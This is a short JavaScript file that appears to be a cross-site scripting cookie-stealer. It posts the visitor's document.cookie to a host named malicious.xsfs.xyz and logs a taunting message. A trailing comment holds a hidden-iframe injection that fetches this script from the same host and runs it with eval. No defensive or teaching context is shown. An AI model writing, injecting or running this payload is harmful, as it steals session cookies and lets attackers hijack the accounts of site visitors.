// Quiet cookie monster only let's those who know what happened 🤭🍪

fetch("http://malicious.xsfs.xyz/eat-cookie", {
  method: "POST",
  cache: "no-cache",
  headers: { "Content-Type": "application/json" },
  referrerPolicy: "no-referrer",
  body: JSON.stringify({
    cookie: document.cookie,
  }),
});

console.log(
  "If you see this, it means the cookie monster has stolen your cookies! Oops! 🍪"
);

// <iframe style="display: none" src="javascript:fetch(`http://malicious.xsfs.xyz/public/quiet-cookie-monster.js`).then((response) => { return response.text() }).then((data) => { eval(data) });">
